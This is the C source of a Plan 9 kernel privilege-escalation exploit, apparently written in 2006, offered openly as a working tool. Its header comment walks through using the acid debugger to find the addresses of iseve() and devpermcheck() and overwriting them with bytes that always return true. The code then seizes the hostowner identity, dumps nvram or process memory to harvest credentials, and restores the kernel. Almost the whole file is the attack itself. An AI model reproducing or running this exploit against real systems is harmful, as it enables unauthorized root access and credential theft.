/* !!! DO NOT DISTRIBUTE !!! */

/* identity theft 
 *
 * this exploit uses my devenv.c OTRUNC/pwrite vulnerability
 * to overwrite specific kernel addresses to help elevate our
 * privileges. this exploit is *very* picky, so you *must*
 * understand the plan9 kernel and know what you are
 * doing, though a best-practice usage example will 
 * guide new users.
 *
 * the exploit process is:
 *	1) determine the user we're running as
 *	2) determine the hostowner for the server
 *	3) overwrite specific kernel addresses
 *	4) write our username to  '#c/hostowner' 
 *	5) steal credentials by copying nvram or paging
 *		through kernel memory for resident creds
 *	6) reset previously overwritten functions 
 *	7) write the original username back to '#c/hostowner'
 *
 * a best practice usage example is to overwrite iseve() so
 * the kernel is tricked into thinking we're the host owner. 
 * secondly, we can overwrite devpermcheck() to trick the
 * kernel into thinking we have permissions to access any
 * given in-kernel device file. this will give us immediate
 * access to things like /srv/fscons and '#S/sdC0/nvram'. 
 *
 * to get the address you want to overwrite, use the plan9
 * debugger after you figure out which kernel the system
 * is booting:
 *
 * cpu% acid /386/9pccpu
 * /386/9pccpu:386 plan 9 boot image
 *
 * /sys/lib/acid/port
 * /sys/lib/acid/386
 * acid: print(iseve)
 * 0xf018d3db
 * acid: mem(iseve, "X")
 * 0x8b0cec83
 * acid: print(devpermcheck)
 * 0xf0192a6b
 * acid: mem(devpermcheck, "X")
 * 0x8b14ec83
 * acid: ^D
 * cpu% ./itheft -n -o nvram.img -s 0,1024 \
 *	-k 0xf018d3db,83ec0c8b,31c040c3 \
 *	-k 0xf0192a6b,83ec148b,31c040c3
 *
 * as you can see, we overwrite the function addresses in 
 * kmem with:
 *
 *	xorl %eax, %eax
 *	incl %eax
 *	retl
 *
 * a note on exploit effects. 
 * when we overwrite '#c/hostowner', the kernel 
 * automatically changes all processes owned by the 
 * previous hostowner id to the new id. when the exploit
 * has obtained the target information from the kernel, it
 * will write the previous hostowner id to '#c/hostowner'. 
 * since *your* id was now just the hostowner id, this 
 * second write will alter *your* bin/rc instance's owner
 * to the id of the original hostowner. this may seem 
 * desirable, however it isn't. the reason is that despite 
 * having access to the hostowner's name, we don't have
 * access to the hostowner's credentials. thus, access to
 * their files and factotum is still disabled. 
 * 
 * therefore, it's best to immediately exit your CPU shell
 * once the exploit is finished. 
 *
 * lastly, when using a target of Tmem, expect a kernel 
 * panic when you trigger a page fault with a bad address. 
 * make sure you define an appropriate base and ceiling 
 * when paging through memory. 
 *
 * NB: it'd be nice to have a memory disclosure exploit that's
 * as reliable as this one to help verify whether or not the 
 * kernel addresses are as expected (whether or not we've
 * ran bin/acid on the appropriate kernel and obtained the
 * correct kernel addresses)
 *
 * Don "north" Bailey 12/27/06
 * don.bailey@gmail.com
 *
 * you say the hill is too steep to climb
 * you say you'd like to see me try
 * you pick the place and I'll choose the time
 * and I'll climb the hill in my own way
 *  - gilmour/waters
 */

#include <u.h>
#include <libc.h>

enum
{
	False,
	True,
};

enum
{
	Anew,
	Aold,
};

enum
{
	Tmem,
	Tnvram,
};

typedef struct Seg Seg;
typedef struct Kfunc Kfunc;

struct
Seg
{
	ulong base;
	ulong ceiling;
};

struct
Kfunc
{
	int nnew;
	int nold;
	vlong addr;
	uchar * new;
	uchar * old;
	Kfunc * next; 
};

static int outfd;
static int envfd;
static char * us;
static Seg * seg;
static int pagesz;
static Kfunc * kf;
static char * them;
static char * outfile;
static char * envpath;
static int target = Tnvram;

static int spin(void);
static int steal(void);
static int kwrite(int);
static void usage(void);
static int addk(char * );
static int envfile(void);
static uchar gethex(char);
static void cleanup(void);
static int getpagesz(void);
static int envremove(void);
static int addseg(char * );
static void delk(Kfunc ** );
static int myidentity(void);
static int stealfile(char * );
static int youridentity(void);
static int sethostowner(char * );
static void err(const char *, ... );
static void msg(const char *, ... );
static int arguments(int, char ** );
static int userfile(char *, char ** );
static void xstrdup(char *, char ** );
static int parsebytes(char *, uchar **, int * );

void
main(int argc, char * argv[])
{
	int e;

	e = arguments(argc, argv);
	if(!e)
		usage();
	else
		e = spin();

	cleanup();

	if(e)
		exits(nil);

	exits("you suck as a thief");
}

static void
cleanup(void)
{
	Kfunc * k;
	Kfunc * l;

	if(us)
		free(us);
	if(seg)
		free(seg);
	if(them)
		free(them);
	if(outfile)
		free(outfile);
	if(envpath)
		free(envpath);

	if(envfd > 0)
		close(envfd);
	if(outfd > 0)
		close(outfd);

	for(k = kf; k; k = l)
	{
		l = k->next;
		delk(&k);
	}
}

static void
usage(void)
{
	fprint(
		2, 
		"usage: ithief [-{n|m}] -s base,ceiling "
		"-o outfile -k ... [-k ... ]\n");
}

static int
arguments(int argc, char ** argv)
{
	char * p;

	ARGBEGIN
	{
	case 'n':
		{
			target = Tnvram;
			break;
		}
	case 'm':
		{
			target = Tmem;
			break;
		}
	case 's':
		{
			p = ARGF();
			if(!p)
			{
				err("option 's' needs an argument");
				return False;
			}

			if(!addseg(p))
				return False;

			break;
		}
	case 'k':
		{
			p = ARGF();
			if(!p)
			{
				err("option 'k' needs an argument");
				return False;
			}

			if(!addk(p))
				return False;

			break;
		}
	case 'o':
		{
			p = ARGF();
			if(!p)
			{
				err("option 'o' needs an argument");
				return False;
			}

			if(outfile)
			{
				err("option 'o' already set");
				return False;
			}

			xstrdup(p, &outfile);
			break;
		}
	default:
		{
			err("unknown option '%c'", ARGC());
			return False;
		}
	}
	ARGEND

	if(!kf)
	{
		err("at least one 'k' is required");
		return False;
	}

	if(!seg)
	{
		err("one 's' is required");
		return False;
	}

	if(!outfile)
	{
		err("an output file is required");
		return False;
	}

	return True;
}

static void
err(const char * fmt, ... )
{
	va_list v;

	va_start(v, fmt);

	fprint(2, "error: ");
	vfprint(2, fmt, v);
	fprint(2, "\n");

	va_end(v);
}

static void
msg(const char * fmt, ... )
{
	va_list v;

	va_start(v, fmt);

	fprint(1, "ithief: ");
	vfprint(1, fmt, v);
	fprint(1, "\n");

	va_end(v);
}

static void
xstrdup(char * in, char ** outp)
{
	char * out;
	int sz;

	sz = strlen(in) + 1;

	out = calloc(1, sz);
	if(!out)
	{
		perror("calloc");
		abort();
	}

	memcpy(out, in, sz);
	*outp = out;
}

static int
addk(char * p)
{
	Kfunc * kp;
	Kfunc * k;
	char * c;
	char * e;
	char t;

	k = calloc(1, sizeof *k);
	if(!k)
	{
		perror("calloc");
		abort();
	}

	for(c = p; *c && *c != ','; c++)
		;
	t = *c;
	*c = 0;

	k->addr = strtoull(p, 0, 0);
	*c = t;

	if(!t)
		goto _fail;

	for(e = ++c; *c && *c != ','; c++)
		;
	t = *c;
	*c = 0;

	if(!parsebytes(e, &k->old, &k->nold))
		goto _fail;

	if(!t)
		goto _fail;

	for(e = ++c; *c; c++)
		;

	if(!parsebytes(e, &k->new, &k->nnew))
		goto _fail;

	for(kp = kf; kp && kp->next; kp = kp->next)
		;
	if(!kp)
		kf = k;
	else
		kp->next = k;

	return True;

_fail:
	err("invalid K syntax");
	delk(&k);
	return False;
}

static void
delk(Kfunc ** kp)
{
	Kfunc * k;

	k = *kp;
	*kp = nil;

	if(k->new)
		free(k->new);
	if(k->old)
		free(k->old);

	free(k);
}

static int
parsebytes(char * p, uchar ** bytesp, int * np)
{
	uchar * bytes;
	uchar byte;
	int n;

	n = strlen(p);
	if(n % 2)
	{
		err("the byte stream must be an even length");
		return False;
	}

	n = 0;
	bytes = nil;

	while(p[0] && p[1])
	{
		byte = gethex(p[0]) << 4 | gethex(p[1]);
		bytes = realloc(bytes, (n + 1) * sizeof *bytes);
		bytes[n++] = byte;
		p += 2;
	}

	*bytesp = bytes;
	*np = n;

	return True;
}

static uchar 
gethex(char c)
{
	return (c >= '0' && c <= '9') ? c - '0' :
			(c >= 'a' && c <= 'f') ? c - 'a' + 10 :
				(c >= 'A' && c <= 'F') ? c - 'A' + 10 :
					-1;
}

static int
spin(void)
{
	outfd = create(outfile, OWRITE, 0600);
	if(outfd < 0)
	{
		err("can't create \"%s\": %r", outfile);
		return False;
	}

	if(!getpagesz())
		return False;

	if(!myidentity())
		return False;

	if(!youridentity())
		return False;

	if(!envfile())
		return False;

	if(!kwrite(Anew))
		return False;

	if(!sethostowner(us))
		return False;

	if(!steal())
		return False;

	if(!kwrite(Aold))
		return False;

	if(!sethostowner(them))
		return False;

	return envremove();
}

static int
getpagesz(void)
{
	char buffer[64];
	char * p;
	char * q;
	int fd;
	int e;

	fd = open("#c/swap", OREAD);
	if(fd < 0)
	{
		err("can't open \"#c/swap\": %r");
		return False;
	}

	e = read(fd, buffer, sizeof buffer);
	if(e < 0)
	{
		err("can't read \"#c/swap\": %r");
		close(fd);
		return False;
	}

	close(fd);

	for(p = buffer; (p - buffer) < sizeof buffer && *p != '\n'; p++)
		;
	for(q = ++p; 
		(q - buffer) < sizeof buffer && (*q != ' ' && *q != '\t'); 
		q++)
		;
	*q = 0;

	pagesz = strtoul(p, 0, 0);
	msg("the system page size is %d", pagesz);

	return True;
}

static int
myidentity(void)
{
	if(!userfile("#c/user", &us))
		return False;

	msg("we are \"%s\"", us);
	return True;
}

static int
youridentity(void)
{
	if(!userfile("#c/hostowner", &them))
		return False;

	if(!strcmp(us, them))
	{
		err("we are the hostowner, genius");
		return False;
	}

	msg("they are \"%s\"", them);
	return True;
}

static int
userfile(char * uf, char ** namep)
{
	char buffer[1024];
	int fd;
	int n;

	fd = open(uf, OREAD);
	if(fd < 0)
	{
		err("can't obtain an username from \"%s\": %r", uf);
		return False;
	}

	n = read(fd, buffer, sizeof buffer);
	if(n <= 0)
	{
		err("bad read on \"%s\"? %r");
		close(fd);
		return False;
	}

	if(n == sizeof buffer)
		n = sizeof buffer - 1;

	buffer[n] = 0;

	close(fd);
	xstrdup(buffer, namep);

	return True;
}

static int
envfile(void)
{
	char buffer[32];
	char * p;
	int fd;

	/* easier to just create our own and rm it */

	snprint(buffer, sizeof buffer, "#e/XXXXXXXXXXX");

	p = mktemp(buffer);
	if(!p[0] || (p[0] == '/' && !p[1]))
	{
		err("mktemp failed: %r");
		return False;
	}

	msg("creating \"%s\"", p);

	fd = create(p, ORDWR, 0600);
	if(fd < 0)
	{
		err("can't create \"%s\": %r", p);
		return False;
	}

	msg("truncating \"%s\"", p);
	close(fd);

	fd = open(p, OWRITE|OTRUNC);
	if(fd < 0)
	{
		err("can't open \"%s\": %r", p);
		return False;
	}

	msg("\"%s\" is ready for manipulation", p);

	xstrdup(buffer, &envpath);
	envfd = fd;

	return True;
}

static int
kwrite(int obj)
{
	Kfunc * k;
	uchar * p;
	long b;
	long n;

	for(k = kf; k; k = k->next)
	{
		if(obj == Anew)
		{
			p = k->new;
			b = k->nnew;
		}
		else
		{
			p = k->old;
			b = k->nold;
		}

		msg(
			"writing %d %s bytes to %lluX", 
			b, 
			obj == Anew ? "new" : "old", 
			k->addr);

		n = pwrite(envfd, p, b, k->addr);
		if(n != b)
		{
			err("failed to write to \"%s\": %r", envpath);
			return False;
		}
	}

	return True;
}

static int
sethostowner(char * new)
{
	char * test;
	int fd;
	int n;
	int e;

	fd = open("#c/hostowner", OWRITE);
	if(fd < 0)
	{
		err("can't open \"#c/hostowner\": %r");
		return False;
	}

	n = strlen(new);

	e = write(fd, new, n);
	if(e != n)
	{
		err("write to \"#c/hostowner\" failed: %r");
		close(fd);
		return False;
	}

	close(fd);
	msg("write of \"%s\" to \"#c/hostowner\" succeeded", new);

	if(!userfile("#c/hostowner", &test))
	{
		err("can't retrieve \"#c/hostowner\" for comparison?");
		return False;
	}

	e = strcmp(new, test) == 0;
	if(!e)
	{
		err(
			"write on \"#c/hostowner\" succeeded but stored"
			"value isn't as expected: \"%s\"", 
			test);
	}

	free(test);

	return e;
}

static int
steal(void)
{
	char buffer[32];

	if(target == Tnvram)
		return stealfile("#S/sdC0/nvram");

	snprint(buffer, sizeof buffer, "#p/%d/mem", getpid());

	return stealfile(buffer);
}

static int
stealfile(char * path)
{
	uchar * page;
	ulong addr;
	long n;
	int fd;

	msg("opening \"%s\" for imaging", path);

	fd = open(path, OREAD);
	if(fd < 0)
	{
		err("can't open \"%s\": %r", path);
		return False;
	}

	page = calloc(1, pagesz);
	if(!page)
	{
		err("calloc failed: %r");
		abort();
	}

	addr = seg->base;

	while(addr < seg->ceiling)
	{
		n = pread(fd, page, pagesz, addr);
		if(n <= 0)
		{
			if(n < 0)
				err("read on \"%s\" failed: %r", path);
			break;
		}

		write(outfd, page, n);
		addr += n;
	}

	return True;
}

static int
envremove(void)
{
	remove(envpath);
	return True;
}

static int
addseg(char * p)
{
	ulong ceiling;
	ulong base;
	char * c;
	Seg * s;
	char t;

	if(seg)
	{
		err("only one segment can be defined");
		return False;
	}

	for(c = p; *c && *c != ','; c++)
		;
	if(!*c)
	{
		err("invalid seg syntax");
		return False;
	}

	t = *c;
	*c = 0;

	base = strtoul(p, 0, 0);
	*c++ = t;

	ceiling = strtoul(c, 0, 0);

	if(ceiling <= base)
	{
		err("invalid seg syntax; ceiling <= base");
		return False;
	}

	s = calloc(1, sizeof *s);
	if(!s)
	{
		perror("calloc");
		abort();
	}

	s->base = base;
	s->ceiling = ceiling;

	msg("using a segment of %luX -> %luX", s->base, s->ceiling);

	seg = s;

	return True;
}